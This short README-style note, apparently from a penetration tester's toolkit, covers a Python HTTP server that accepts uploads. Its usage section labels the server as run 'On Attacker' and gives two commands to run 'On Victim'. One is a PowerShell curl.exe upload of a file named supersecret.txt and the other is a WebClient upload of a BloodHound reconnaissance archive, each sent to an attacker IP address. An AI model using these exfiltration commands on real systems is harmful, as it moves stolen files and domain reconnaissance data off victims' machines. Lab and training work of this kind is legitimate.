# Name
SimpleHTTPServerWithUpload.py

## Usage
```
# On Attacker:
python3 SimpleHTTPServerWithUpload.py 80

# On Victim:
powershell -c curl.exe -F 'file=@C:\\temp\\supersecret.txt' http://172.16.1.30
(New-Object System.Net.WebClient).UploadFile('http://192.168.45.5/', 'C:\temp\20230425015352_BloodHound.zip')
```

## Source
https://raw.githubusercontent.com/Tallguy297/SimpleHTTPServerWithUpload/master/SimpleHTTPServerWithUpload.py

